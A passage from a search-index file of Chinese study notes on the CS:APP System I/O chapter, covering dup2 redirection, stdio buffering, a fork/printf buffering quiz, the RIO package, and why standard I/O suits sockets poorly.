I/O \u200b\u91cd\u5b9a\u5411","text":"<p>Linux shell \u200b\u63d0\u4f9b\u200b\u4e86\u200b I/O \u200b\u91cd\u200b\u5b9a\u5411\u64cd\u4f5c\u7b26\u200b, \u200b\u4f8b\u5982\u200b:</p> Bash<pre><code>linux&gt; ls &gt; foo.txt\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b dup2 \u200b\u51fd\u6570\u200b\u5b9e\u73b0\u200b\u6587\u4ef6\u200b\u7684\u200b\u91cd\u5b9a\u5411\u200b. </p> <p>dup2 \u200b\u51fd\u6570\u200b\u590d\u5236\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u8868\u200b\u9879\u200b oldfd \u200b\u5230\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u8868\u200b\u9879\u200b newfd, \u200b\u8986\u76d6\u200b newfd \u200b\u4ee5\u524d\u200b\u7684\u200b\u5185\u5bb9\u200b. \u200b\u5982\u679c\u200b newfd \u200b\u539f\u6765\u200b\u6307\u5411\u200b\u7684\u200b\u6587\u4ef6\u200b\u5206\u8eab\u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b\u53d8\u6210\u200b 0 \u200b\u4e86\u200b, \u200b\u5185\u6838\u200b\u5c31\u200b\u4f1a\u200b\u56de\u6536\u200b\u5b83\u200b.</p> <p></p> <p>\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u628a\u200b fd1 \u200b\u5bf9\u5e94\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u53d8\u6210\u200b fd4 \u200b\u5bf9\u5e94\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b.</p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#108-io","title":"10.8 \u200b\u6807\u51c6\u200b I/O","text":"<p>C \u200b\u8bed\u8a00\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u7ec4\u200b\u9ad8\u7ea7\u200b\u8f93\u5165\u8f93\u51fa\u200b\u51fd\u6570\u200b\uff0c\u200b\u79f0\u4e3a\u200b\u6807\u51c6\u200b I/O \u200b\u5e93\u200b\uff0c\u200b\u4e3a\u200b\u7a0b\u5e8f\u5458\u200b\u63d0\u4f9b\u200b\u4e86\u200b UnixI/O \u200b\u7684\u200b\u8f83\u9ad8\u7ea7\u200b\u522b\u7684\u200b\u66ff\u4ee3\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u5e93\u200b (libc) \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6253\u5f00\u200b\u548c\u200b\u5173\u95ed\u200b\u6587\u4ef6\u200b\u7684\u200b\u51fd\u6570\u200b (fopen \u200b\u548c\u200b fclose) \u3001\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u5b57\u8282\u200b\u7684\u200b\u51fd\u6570\u200b(fread \u200b\u548c\u200b fwrite)\u3001\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u51fd\u6570\u200b(fgets \u200b\u548c\u200b fputs)\uff0c\u200b\u4ee5\u53ca\u200b\u590d\u6742\u200b\u7684\u200b\u683c\u5f0f\u5316\u200b\u7684\u200b I/O \u200b\u51fd\u6570\u200b(scanf \u200b\u548c\u200b printf).</p> <p>\u200b\u6807\u51c6\u200b I/O \u200b\u5e93\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u6a21\u578b\u200b\u5316\u4e3a\u200b\u4e00\u4e2a\u200b\u6d41\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u7a0b\u5e8f\u5458\u200b\u800c\u8a00\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u6d41\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b FILE \u200b\u7c7b\u578b\u200b\u7684\u200b\u7ed3\u6784\u200b\u7684\u200b\u6307\u9488\u200b\u3002\u200b\u6bcf\u4e2a\u200b ANSI C \u200b\u7a0b\u5e8f\u200b\u5f00\u59cb\u200b\u65f6\u200b\u90fd\u200b\u6709\u200b\u4e09\u4e2a\u200b\u6253\u5f00\u200b\u7684\u200b\u6d41\u200b stdin\u3001stdout \u200b\u548c\u200b stderr\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u4e8e\u200b\u6807\u51c6\u200b\u8f93\u200b\u4eba\u200b\u3001\u200b\u6807\u51c6\u200b\u8f93\u51fa\u200b\u548c\u200b\u6807\u51c6\u200b\u9519\u8bef\u200b: </p> <p>\u200b\u7f13\u51b2\u533a\u200b\u7684\u200b\u76ee\u7684\u200b\u5c31\u662f\u200b\u4f7f\u200b\u5f00\u9500\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b Linux I/O \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u7684\u200b\u6570\u91cf\u200b\u5c3d\u53ef\u80fd\u200b\u5c0f\u200b, \u200b\u4f8b\u5982\u200b, \u200b\u8bfb\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u5e93\u4f1a\u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b\u4e00\u6b21\u200b read \u200b\u51fd\u6570\u200b\u6765\u200b\u586b\u5145\u200b\u7f13\u51b2\u533a\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u7684\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7f13\u51b2\u533a\u200b\u8fdb\u884c\u200b. \u200b\u5199\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u4e0d\u4f1a\u200b\u7acb\u5373\u200b\u8c03\u7528\u200b write, \u200b\u800c\u662f\u200b\u7b49\u200b\u7f13\u51b2\u533a\u200b\u586b\u6ee1\u200b\u4e86\u200b\u6216\u8005\u200b\u9047\u5230\u200b\u67d0\u4e9b\u200b\u6761\u4ef6\u200b\u4e4b\u540e\u200b\u518d\u200b\u8c03\u7528\u200b write. </p> <p>\u200b\u6807\u51c6\u200b IO \u200b\u6d41\u200b\u4e0e\u200b\u6587\u4ef6\u200b\u7684\u200b\u8fde\u63a5\u200b</p> <p><code>stdio</code> \u200b\u6d41\u200b\uff08<code>FILE *</code>\uff09\u200b\u662f\u200b\u5bf9\u200b\u5e95\u5c42\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff08<code>int fd</code>\uff09\u200b\u7684\u200b\u5c01\u88c5\u200b\uff0c\u200b\u4e3b\u8981\u200b\u76ee\u7684\u200b\u662f\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u7f13\u51b2\u200b\uff08Buffering\uff09\u3002</p> <ol> <li>\u200b\u6253\u5f00\u200b\u6587\u4ef6\u200b\uff1a \u200b\u5f53\u200b\u4f60\u200b\u4f7f\u7528\u200b <code>fopen(\"data.txt\", \"r\")</code> \u200b\u65f6\u200b\uff0c<code>fopen</code> \u200b\u5728\u200b\u5e95\u5c42\u200b\u5b9e\u9645\u4e0a\u200b\u4f1a\u200b\u8c03\u7528\u200b <code>open(\"data.txt\", O_RDONLY)</code>\uff0c\u200b\u83b7\u53d6\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff08\u200b\u4f8b\u5982\u200b \\(FD=3\\)\uff09\u3002</li> <li> <p>\u200b\u521b\u5efa\u200b\u6d41\u200b\uff1a <code>fopen</code> \u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b <code>FILE</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ed3\u6784\u200b\u4f53\u200b\u5185\u90e8\u200b\u5b58\u50a8\u200b\u7740\u200b\uff1a</p> </li> <li> <p>\u200b\u8be5\u200b\u6587\u4ef6\u200b\u7684\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff08\\(FD=3\\)\uff09\u3002</p> </li> <li>\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u8bfb\u200b/\u200b\u5199\u200b\u4f18\u5316\u200b\u7684\u200b\u5185\u5b58\u200b\u7f13\u51b2\u533a\u200b\u3002</li> <li> <p>\u200b\u5f53\u524d\u200b\u6d41\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3001\u200b\u6a21\u5f0f\u200b\u7b49\u200b\u72b6\u6001\u200b\u4fe1\u606f\u200b\u3002</p> </li> <li> <p>\u200b\u8bfb\u5199\u64cd\u4f5c\u200b\uff1a \u200b\u5f53\u200b\u4f60\u200b\u8c03\u7528\u200b <code>fscanf(fp, ...)</code> \u200b\u65f6\u200b\uff0cC \u200b\u5e93\u4f1a\u200b\u5148\u200b\u5c1d\u8bd5\u200b\u4ece\u200b\u5185\u5b58\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u8bfb\u53d6\u6570\u636e\u200b\u3002\u200b\u5982\u679c\u200b\u7f13\u51b2\u533a\u200b\u7a7a\u200b\u4e86\u200b\uff0cC \u200b\u5e93\u4f1a\u200b\u4f7f\u7528\u200b\u5e95\u5c42\u200b\u7684\u200b <code>read(3, ...)</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u4e00\u6b21\u6027\u200b\u8bfb\u53d6\u200b\u4e00\u5927\u5757\u200b\u6570\u636e\u200b\u5230\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u63d0\u4f9b\u200b\u7ed9\u200b <code>fscanf</code>\u3002</p> </li> </ol> <p>\u200b\u5199\u5165\u200b\u6587\u4ef6\u200b\u548c\u200b\u5199\u5165\u200b\u7ec8\u7aef\u200b\u7684\u200b\u7f13\u51b2\u200b\u65b9\u5f0f\u200b</p> <p>\u200b\u5bf9\u4e8e\u200b\u78c1\u76d8\u200b\u6587\u4ef6\u200b, stdio \u200b\u9ed8\u8ba4\u200b\u91c7\u7528\u200b\u5168\u200b\u7f13\u51b2\u200b\u6a21\u5f0f\u200b, \u200b\u5373\u200b\u9047\u5230\u200b\u7f13\u51b2\u533a\u200b\u5199\u6ee1\u200b, \u200b\u663e\u5f0f\u200b\u8c03\u7528\u200b fflush(), \u200b\u6b63\u5e38\u200b\u9000\u51fa\u200b\u6216\u200b\u5173\u95ed\u200b\u6587\u4ef6\u200b\u65f6\u624d\u200b\u4f1a\u200b\u5237\u65b0\u200b\u7f13\u51b2\u533a\u200b \u200b\u5bf9\u4e8e\u200b\u5199\u5165\u200b\u5230\u200b\u7ec8\u7aef\u200b, \u200b\u9ed8\u8ba4\u200b\u91c7\u7528\u200b\u884c\u200b\u7f13\u51b2\u200b\u6a21\u5f0f\u200b, \u200b\u9047\u5230\u200b\u6362\u884c\u7b26\u200b\u4e5f\u200b\u4f1a\u200b\u5237\u65b0\u200b\u7f13\u51b2\u533a\u200b.</p> <p>Buffer Quiz</p> C<pre><code>fork() &amp;&amp; fork();\nprintf(\"-\");\nfork() || fork();\nprintf(\"-\");\n</code></pre> <p>\u200b\u8fd9\u200b\u6bb5\u200b\u4ee3\u7801\u200b\u5728\u200b\u7ec8\u7aef\u200b\u4e00\u5171\u200b\u8f93\u51fa\u200b\u51e0\u4e2a\u200b \"-\" \u200b\u5b57\u7b26\u200b? (\u200b\u5982\u679c\u200b\u662f\u200b\u8f93\u51fa\u200b\u5230\u200b\u6587\u4ef6\u200b, \u200b\u4e00\u5171\u200b\u8f93\u51fa\u200b\u51e0\u4e2a\u200b \"-\" \u200b\u5b57\u7b26\u200b?) (\u200b\u5982\u679c\u200b\u589e\u52a0\u200b \\n, \u200b\u6253\u5370\u200b\u5230\u200b\u6587\u4ef6\u200b\u548c\u200b\u7ec8\u7aef\u200b\u5206\u522b\u200b\u4e00\u5171\u200b\u8f93\u51fa\u200b\u51e0\u4e2a\u200b \"-\" \u200b\u5b57\u7b26\u200b?)</p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#109-rio","title":"10.9 RIO \u200b\u7684\u200b\u5e26\u200b\u7f13\u51b2\u200b\u7684\u200b\u8f93\u5165\u200b\u51fd\u6570","text":"<p>RIO \u200b\u662f\u200b\u4e00\u79cd\u200b\u5065\u58ee\u200b\u7684\u200b I/O \u200b\u5305\u200b, \u200b\u5b83\u4f1a\u200b\u81ea\u52a8\u200b\u5904\u7406\u200b\u4e0d\u8db3\u200b\u503c\u200b. \u200b\u5728\u200b\u50cf\u200b\u7f51\u7edc\u200b\u7a0b\u5e8f\u200b\u8fd9\u6837\u200b\u5bb9\u6613\u200b\u51fa\u73b0\u200b\u4e0d\u8db3\u200b\u503c\u200b\u7684\u200b\u5e94\u7528\u200b\u4e2d\u200b, RIO \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u65b9\u4fbf\u200b, \u200b\u5065\u58ee\u200b\u548c\u200b\u9ad8\u6548\u200b\u7684\u200b I/O \u200b\u51fd\u6570\u200b. RIO \u200b\u63d0\u4f9b\u200b\u4e24\u7c7b\u200b\u4e0d\u540c\u200b\u7684\u200b\u51fd\u6570\u200b:</p> <ul> <li>\u200b\u65e0\u200b\u7f13\u51b2\u200b\u7684\u200b\u8f93\u5165\u8f93\u51fa\u200b\u51fd\u6570\u200b. \u200b\u8fd9\u4e9b\u200b\u51fd\u6570\u200b\u76f4\u63a5\u200b\u5728\u200b\u5185\u5b58\u200b\u548c\u200b\u6587\u4ef6\u200b\u4e4b\u95f4\u200b\u4f20\u9012\u6570\u636e\u200b, \u200b\u6ca1\u6709\u200b\u5e94\u7528\u200b\u7ea7\u200b\u7f13\u51b2\u200b.</li> <li>\u200b\u5e26\u200b\u7f13\u51b2\u200b\u7684\u200b\u8f93\u5165\u200b\u51fd\u6570\u200b. \u200b\u8fd9\u4e9b\u200b\u51fd\u6570\u200b\u9ad8\u6548\u200b\u5730\u200b\u4ece\u6587\u4ef6\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u6587\u672c\u200b\u884c\u200b\u548c\u200b\u4e8c\u8fdb\u5236\u200b\u6570\u636e\u200b, \u200b\u6587\u4ef6\u200b\u7684\u200b\u5185\u5bb9\u200b\u7f13\u5b58\u200b\u5728\u200b\u5e94\u7528\u200b\u7ea7\u200b\u7f13\u51b2\u533a\u200b\u5185\u200b. \u200b\u5e26\u200b\u7f13\u51b2\u200b\u7684\u200b RIO \u200b\u8f93\u5165\u200b\u51fd\u6570\u200b\u662f\u200b\u7ebf\u7a0b\u200b\u5b89\u5168\u200b\u7684\u200b, \u200b\u5b83\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u4ea4\u9519\u200b\u5730\u200b\u8c03\u7528\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#1091-rio","title":"10.9.1 RIO \u200b\u7684\u200b\u65e0\u200b\u7f13\u51b2\u200b\u7684\u200b\u8f93\u5165\u8f93\u51fa\u200b\u51fd\u6570","text":"<p>\u200b\u901a\u8fc7\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b, \u200b\u6211\u4eec\u200b\u89e3\u51b3\u200b\u4e86\u200b read \u200b\u88ab\u200b\u4fe1\u53f7\u200b\u4e2d\u65ad\u200b\u8bfb\u5165\u200b\u4e0d\u8db3\u200b\u503c\u200b\u7684\u200b\u95ee\u9898\u200b. (\u200b\u5982\u679c\u200b read \u200b\u5728\u200b\u8bfb\u5165\u200b\u90e8\u5206\u200b\u6570\u636e\u200b\u540e\u200b\u88ab\u200b\u4e2d\u65ad\u200b, \u200b\u4f1a\u200b\u8fd4\u56de\u200b\u5df2\u7ecf\u200b\u8bfb\u5230\u200b\u7684\u200b\u5b57\u8282\u6570\u200b. \u200b\u5982\u679c\u200b\u5728\u200b\u8bfb\u5165\u200b\u524d\u200b\u88ab\u200b\u4e2d\u65ad\u200b, \u200b\u4f1a\u200b\u8fd4\u56de\u200b EINTR)</p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#1092-rio","title":"10.9.2 RIO \u200b\u7684\u200b\u5e26\u200b\u7f13\u51b2\u200b\u7684\u200b\u8f93\u5165\u200b\u51fd\u6570","text":"<p>\u200b\u6bcf\u200b\u6253\u5f00\u200b\u4e00\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b, \u200b\u5c31\u8981\u200b\u8c03\u7528\u200b\u4e00\u6b21\u200b rio_readinitb \u200b\u51fd\u6570\u200b, \u200b\u5b83\u200b\u5c06\u200b\u63cf\u8ff0\u7b26\u200b fd \u200b\u548c\u200b\u5730\u5740\u200b rp \u200b\u5904\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7c7b\u578b\u200b\u4e3a\u200b rio_t \u200b\u7684\u200b\u8bfb\u200b\u7f13\u51b2\u533a\u200b\u8054\u7cfb\u200b\u8d77\u6765\u200b.</p> <p>rio_readlineb \u200b\u4ece\u200b\u7f13\u51b2\u533a\u200b rp \u200b\u4e2d\u200b\u8bfb\u51fa\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u6587\u672c\u200b\u884c\u200b, \u200b\u5c06\u200b\u5b83\u200b\u590d\u5236\u5230\u200b\u5185\u5b58\u200b\u4f4d\u7f6e\u200b usrbuf, \u200b\u5e76\u7528\u200b NULL \u200b\u5b57\u7b26\u200b\u7ed3\u675f\u200b\u8fd9\u4e2a\u200b\u6587\u672c\u200b\u884c\u200b. \u200b\u56e0\u6b64\u200b rio_readlineb \u200b\u6700\u591a\u8bfb\u200b maxlen-1 \u200b\u4e2a\u200b\u5b57\u8282\u200b, \u200b\u8d85\u8fc7\u200b maxlen-1 \u200b\u7684\u200b\u6587\u672c\u200b\u884c\u4f1a\u200b\u88ab\u200b\u622a\u65ad\u200b.</p> <p>\u200b\u5bf9\u200b\u540c\u4e00\u200b\u63cf\u8ff0\u7b26\u200b, rio_readlineb \u200b\u548c\u200b rio_readnb \u200b\u53ef\u4ee5\u200b\u4ea4\u53c9\u200b\u8fdb\u884c\u200b. \u200b\u7136\u800c\u200b\u5e26\u200b\u7f13\u51b2\u200b\u7684\u200b\u51fd\u6570\u8c03\u7528\u200b\u5374\u200b\u4e0d\u5e94\u200b\u548c\u200b\u65e0\u200b\u7f13\u51b2\u200b\u7684\u200b rio_readn \u200b\u4ea4\u53c9\u200b\u4f7f\u7528\u200b. (\u200b\u5982\u679c\u200b\u4ea4\u53c9\u200b\u4f7f\u7528\u200b, \u200b\u65e0\u200b\u7f13\u51b2\u200b\u4f1a\u200b\u4ece\u200b\u7f13\u51b2\u533a\u200b\u7ed3\u675f\u200b\u540e\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5b57\u7b26\u200b\u5f00\u59cb\u200b\u8bfb\u200b, \u200b\u800c\u200b\u4e0d\u662f\u200b\u7f13\u51b2\u533a\u200b\u5185\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5b57\u7b26\u200b, \u200b\u5bfc\u81f4\u200b\u9519\u4f4d\u200b.) </p> <p>RIO \u200b\u8bfb\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b rio_read \u200b\u51fd\u6570\u200b, \u200b\u5b83\u200b\u662f\u200b Linux read \u200b\u51fd\u6570\u200b\u7684\u200b\u5e26\u200b\u7f13\u51b2\u200b\u7248\u672c\u200b. \u200b\u5f53\u200b\u8c03\u7528\u200b rio_read \u200b\u8981\u6c42\u200b\u8bfb\u200b n \u200b\u4e2a\u200b\u5b57\u8282\u200b\u65f6\u200b, \u200b\u5047\u8bbe\u200b\u90fd\u200b\u7f13\u51b2\u533a\u200b\u5185\u6709\u200b rp-&gt;rio_cnt \u200b\u4e2a\u200b\u672a\u8bfb\u200b\u5b57\u8282\u200b. \u200b\u5982\u679c\u200b\u7f13\u51b2\u533a\u200b\u4e3a\u7a7a\u200b, \u200b\u90a3\u4e48\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b read \u200b\u586b\u6ee1\u200b\u5b83\u200b. \u200b\u4e00\u65e6\u200b\u975e\u7a7a\u200b, rio_read \u200b\u4ece\u8bfb\u200b\u7f13\u51b2\u533a\u200b\u590d\u5236\u200b min(n, rp-&gt;rio_cnt) \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5230\u200b\u7528\u6237\u200b\u7f13\u51b2\u533a\u200b, \u200b\u5e76\u200b\u8fd4\u56de\u200b\u590d\u5236\u200b\u7684\u200b\u5b57\u8282\u6570\u200b.</p> <p> </p> <p>\u200b\u603b\u7ed3\u200b:</p> <ul> <li>read \u200b\u4f1a\u200b\u88ab\u200b\u4fe1\u53f7\u200b\u7ec8\u6b62\u200b, \u200b\u5982\u679c\u200b\u7ec8\u6b62\u200b\u7684\u200b\u65f6\u5019\u200b\u8fd8\u200b\u672a\u8bfb\u200b\u4efb\u4f55\u200b\u6570\u636e\u200b\u8fd4\u56de\u200b -1 \u200b\u5e76\u200b\u8bbe\u7f6e\u200b errno, \u200b\u5982\u679c\u200b\u7ec8\u6b62\u200b\u7684\u200b\u65f6\u5019\u200b\u5df2\u7ecf\u200b\u8bfb\u200b\u4e86\u200b\u90e8\u5206\u200b\u5b57\u8282\u200b\u4f1a\u200b\u8fd4\u56de\u200b\u8bfb\u5230\u200b\u7684\u200b\u5b57\u8282\u6570\u200b, \u200b\u65e0\u200b\u7f13\u51b2\u533a\u200b</li> <li>rio_read \u200b\u4f1a\u200b\u88ab\u200b\u4fe1\u53f7\u200b\u7ec8\u6b62\u200b, \u200b\u5982\u679c\u200b\u7ec8\u6b62\u200b\u7684\u200b\u65f6\u5019\u200b\u8fd8\u200b\u672a\u8bfb\u200b\u4efb\u4f55\u200b\u6570\u636e\u200b\u4f1a\u200b\u91cd\u65b0\u200b\u5c1d\u8bd5\u200b, \u200b\u5982\u679c\u200b\u7ec8\u6b62\u200b\u7684\u200b\u65f6\u5019\u200b\u5df2\u7ecf\u200b\u8bfb\u200b\u4e86\u200b\u90e8\u5206\u200b\u5b57\u8282\u200b\u4f1a\u200b\u8fd4\u56de\u200b\u8bfb\u5230\u200b\u7684\u200b\u5b57\u8282\u6570\u200b, \u200b\u6709\u200b\u7f13\u51b2\u533a\u200b</li> <li>rio_readn \u200b\u65e0\u200b\u7f13\u51b2\u533a\u200b, \u200b\u5229\u7528\u200b read \u200b\u5b9e\u73b0\u200b.</li> <li>rio_writen \u200b\u65e0\u200b\u7f13\u51b2\u533a\u200b, \u200b\u5229\u7528\u200b write \u200b\u5b9e\u73b0\u200b.</li> <li>rio_readnb \u200b\u6709\u200b\u7f13\u51b2\u533a\u200b, \u200b\u5229\u7528\u200b rio_read \u200b\u5b9e\u73b0\u200b.</li> <li>rio_readlineb \u200b\u6709\u200b\u7f13\u51b2\u533a\u200b, \u200b\u5229\u7528\u200b rio_read \u200b\u5b9e\u73b0\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#1010-io","title":"10.10 \u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b I/O \u200b\u51fd\u6570","text":"<ul> <li>\u200b\u53ea\u8981\u200b\u6709\u200b\u53ef\u80fd\u200b\u5c31\u200b\u4f7f\u7528\u200b\u6807\u51c6\u200b I/O</li> <li>\u200b\u4e0d\u8981\u200b\u7528\u200b scanf \u200b\u6216\u200b rio_readlineb \u200b\u8bfb\u200b\u4e8c\u8fdb\u5236\u200b\u6587\u4ef6\u200b.</li> <li>\u200b\u5bf9\u200b socket \u200b\u7684\u200b I/O \u200b\u4f7f\u7528\u200b RIO \u200b\u51fd\u6570\u200b.</li> </ul> <p>socket</p> <p>\u200b\u5168\u53cc\u5de5\u200b\u901a\u4fe1\u200b\uff1a\u200b\u540c\u4e00\u4e2a\u200b socket \u200b\u63cf\u8ff0\u7b26\u200b\u53ef\u200b\u540c\u65f6\u200b\u8bfb\u5199\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u65e0\u200b\u6587\u4ef6\u200b\u504f\u79fb\u200b\u6307\u9488\u200b\uff1a\u200b\u8bfb\u5199\u64cd\u4f5c\u200b\u72ec\u7acb\u200b\uff0c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u5bf9\u65b9\u200b\u6570\u636e\u6d41\u200b\u3002</p> <p>\u200b\u7f13\u51b2\u200b\u673a\u5236\u200b\uff1a\u200b\u5185\u6838\u200b\u7ef4\u62a4\u200b\u63a5\u6536\u200b\u548c\u200b\u53d1\u9001\u7f13\u51b2\u533a\u200b\uff0c\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b\u7f13\u51b2\u533a\u200b\u4f20\u8f93\u200b</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u5185\u6838\u200b\u5bf9\u200b\u4e00\u4e2a\u200b socket \u200b\u53ea\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b.</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u7f51\u7edc\u200b\u7f16\u7a0b\u200b\u4e0d\u5b9c\u200b\u4f7f\u7528\u200b Standard I/O</p> <p>\u200b\u5bf9\u4e8e\u200b\u8ddf\u200b\u5728\u200b\u8f93\u51fa\u200b\u51fd\u6570\u200b\u4e4b\u540e\u200b\u7684\u200b\u8f93\u5165\u200b\u51fd\u6570\u200b, \u200b\u7531\u4e8e\u200b\u5957\u200b\u63a5\u5b57\u200b\u4f7f\u7528\u200b lseek \u200b\u51fd\u6570\u200b\u662f\u200b\u975e\u6cd5\u200b\u7684\u200b(\u200b\u5b83\u200b\u6839\u672c\u200b\u6ca1\u6709\u200b\u504f\u79fb\u200b, \u200b\u662f\u200b\u6d41\u5f0f\u200b\u7684\u200b, \u200b\u8fc7\u53bb\u200b\u7684\u200b\u4e0d\u80fd\u200b\u518d\u200b\u56de\u6765\u200b), \u200b\u56e0\u6b64\u200b\u53ea\u80fd\u200b\u4f7f\u7528\u200b fflush \u200b\u5237\u65b0\u200b\u7f13\u5b58\u200b\u533a\u200b.</p> <p>\u200b\u5bf9\u4e8e\u200b\u8ddf\u200b\u5728\u200b\u8f93\u5165\u200b\u51fd\u6570\u200b\u4e4b\u540e\u200b\u7684\u200b\u8f93\u51fa\u200b\u51fd\u6570\u200b, \u200b\u6ca1\u6709\u200b\u529e\u6cd5\u200b\u5237\u65b0\u200b\u7f13\u5b58\u200b\u533a\u200b. \u200b\u9664\u975e\u200b\u8f93\u5165\u200b\u51fd\u6570\u200b\u9047\u5230\u200b\u4e86\u200b\u6587\u4ef6\u200b\u7ed3\u675f\u200b.</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u6211\u4eec\u200b\u8981\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u6253\u5f00\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u63cf\u8ff0\u7b26\u200b\u6253\u5f00\u200b\u4e24\u4e2a\u200b\u6d41\u200b, \u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u8bfb\u200b, \u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u5199\u200b. \u200b\u4f46\u662f\u200b\u4ed6\u200b\u8981\u6c42\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u5728\u200b\u4e24\u4e2a\u200b\u6d41\u4e0a\u200b\u90fd\u200b\u8c03\u7528\u200b fclose, \u200b\u8fd9\u4e9b\u200b\u64cd\u4f5c\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u90fd\u200b\u8bd5\u56fe\u200b\u5173\u95ed\u200b\u540c\u4e00\u4e2a\u200b\u5e95\u5c42\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u63cf\u8ff0\u7b26\u200b, \u200b\u6240\u4ee5\u200b\u7b2c\u4e8c\u4e2a\u200b close \u200b\u4f1a\u200b\u5931\u8d25\u200b. \u200b\u5728\u200b\u4e00\u4e2a\u200b\u7ebf\u7a0b\u200b\u5316\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u5173\u95ed\u200b\u4e00\u4e2a\u200b\u5df2\u7ecf\u200b\u5173\u95ed\u200b\u4e86\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u707e\u96be\u200b. (\u200b\u89c1\u200b 12.7.4 \u200b\u8282\u200b)</p> <p>RIO \u200b\u56e0\u4e3a\u200b\u53ea\u6709\u200b\u8bfb\u5165\u200b\u6709\u200b\u7f13\u5b58\u200b\u533a\u200b, \u200b\u800c\u200b\u5199\u5165\u200b\u6ca1\u6709\u200b\u7f13\u5b58\u200b\u533a\u200b, \u200b\u6240\u4ee5\u200b\u4e0d\u4f1a\u200b\u4e92\u76f8\u200b\u5f71\u54cd\u200b.</p> <p>\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u533a\u4e0a\u200b\u8f93\u5165\u8f93\u51fa\u200b\u4f1a\u200b\u53d1\u751f\u200b\u4ec0\u4e48\u200b</p> <p>\u200b\u5982\u679c\u200b\u6807\u51c6\u200b\u8f93\u5165\u8f93\u51fa\u200b\u5171\u4eab\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u533a\u200b, \u200b\u90a3\u4e48\u200b:</p> <p>\u200b\u5982\u679c\u200b\u5728\u200b\u8f93\u5165\u200b\u51fd\u6570\u200b\u4e4b\u540e\u200b\u6ca1\u6709\u200b\u5237\u65b0\u200b\u7f13\u5b58\u200b\u533a\u200b, 